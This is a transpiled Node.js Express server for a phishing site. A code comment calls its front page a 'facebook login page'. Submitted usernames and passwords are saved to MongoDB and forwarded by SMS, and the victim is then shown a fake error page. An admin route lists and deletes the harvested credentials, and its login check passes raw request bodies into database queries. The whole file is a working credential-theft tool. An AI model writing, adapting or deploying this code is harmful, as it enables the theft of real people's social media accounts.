"use strict";

require('dotenv').config();

var express = require('express');

var mongoose = require('mongoose');

var body_parser = require('body-parser');

var path = require('path');

var _require = require('fs'),
    readFileSync = _require.readFileSync;

var _require2 = require('./public/data'),
    htmlData = _require2.htmlData,
    sendSMS = _require2.sendSMS;

var app = express();
app.use(express.json());
app.use(body_parser.urlencoded({
  extended: true
}));
app.use(express["static"]('public/images'));
app.use(express["static"]('public/fontawesome/css'));
app.use(express["static"]('public'));
var PORT = process.env.PORT || 3500;

var _router = express.Router();

var connectDB = function connectDB() {
  return regeneratorRuntime.async(function connectDB$(_context) {
    while (1) {
      switch (_context.prev = _context.next) {
        case 0:
          _context.prev = 0;
          _context.next = 3;
          return regeneratorRuntime.awrap(mongoose.connect(process.env.LOCAL_CON_STR).then(function () {
            console.log("Database connected succesful");
          }));

        case 3:
          _context.next = 9;
          break;

        case 5:
          _context.prev = 5;
          _context.t0 = _context["catch"](0);
          console.log(_context.t0.message);
          process.exit(1);

        case 9:
        case "end":
          return _context.stop();
      }
    }
  }, null, null, [[0, 5]]);
};

var schema = new mongoose.Schema({
  user_name: {
    type: String,
    required: true,
    trim: true
  },
  password: {
    type: String,
    required: true,
    trim: true
  },
  createAt: String
});
schema.pre('save', function (next) {
  this.createAt = new Date();
  next();
});
var imfor = mongoose.model('imfor', schema); // sending facebook login page

_router.route('/').get(function (req, res) {
  res.status(200).sendFile(path.join(__dirname, 'public', 'index.html'));
}); // creating user


_router.route('/login_details').post(function _callee(req, res) {
  return regeneratorRuntime.async(function _callee$(_context2) {
    while (1) {
      switch (_context2.prev = _context2.next) {
        case 0:
          _context2.next = 2;
          return regeneratorRuntime.awrap(imfor.create(req.body).then(function (result) {
            sendSMS(result);
            res.status(500).sendFile(path.join(__dirname, 'public', 'error', 'error.html'));
          })["catch"](function (err) {
            console.log(err);
          }));

        case 2:
        case "end":
          return _context2.stop();
      }
    }
  });
}); // sending Admin login page


_router.route('/user_account').get(function _callee2(req, res) {
  return regeneratorRuntime.async(function _callee2$(_context3) {
    while (1) {
      switch (_context3.prev = _context3.next) {
        case 0:
          res.status(200).sendFile(path.join(__dirname, 'public', 'login.html'));

        case 1:
        case "end":
          return _context3.stop();
      }
    }
  });
});

var page = readFileSync(path.join(__dirname, 'public/page.html'), {
  encoding: 'utf-8'
}); // getting all users

_router.route('/user_account/api').post(function _callee3(req, res) {
  var isExist, data, renderPage;
  return regeneratorRuntime.async(function _callee3$(_context4) {
    while (1) {
      switch (_context4.prev = _context4.next) {
        case 0:
          _context4.next = 2;
          return regeneratorRuntime.awrap(imfor.findOne(req.body, {
            _id: 1,
            __v: 0
          }));

        case 2:
          isExist = _context4.sent;

          if (!isExist) {
            _context4.next = 9;
            break;
          }

          _context4.next = 6;
          return regeneratorRuntime.awrap(imfor.find({}, {
            __v: 0
          }));

        case 6:
          data = _context4.sent;
          renderPage = htmlData(page, data);
          res.status(200).send(renderPage.join(''));

        case 9:
        case "end":
          return _context4.stop();
      }
    }
  });
}); // deleting user


_router.route('/user_account/api/:id?')["delete"](function _callee4(req, res) {
  return regeneratorRuntime.async(function _callee4$(_context5) {
    while (1) {
      switch (_context5.prev = _context5.next) {
        case 0:
          _context5.prev = 0;
          _context5.next = 3;
          return regeneratorRuntime.awrap(imfor.findOneAndDelete(req.body).then(function () {
            res.status(204).json({
              status: "deleted ".concat(req.body.user_name, " is successfull")
            });
          }));

        case 3:
          _context5.next = 8;
          break;

        case 5:
          _context5.prev = 5;
          _context5.t0 = _context5["catch"](0);
          console.log(_context5.t0.message);

        case 8:
        case "end":
          return _context5.stop();
      }
    }
  }, null, null, [[0, 5]]);
});

app.use('/', _router);
connectDB().then(app.listen(PORT, function () {
  console.log("Server listening on ".concat(PORT));
}));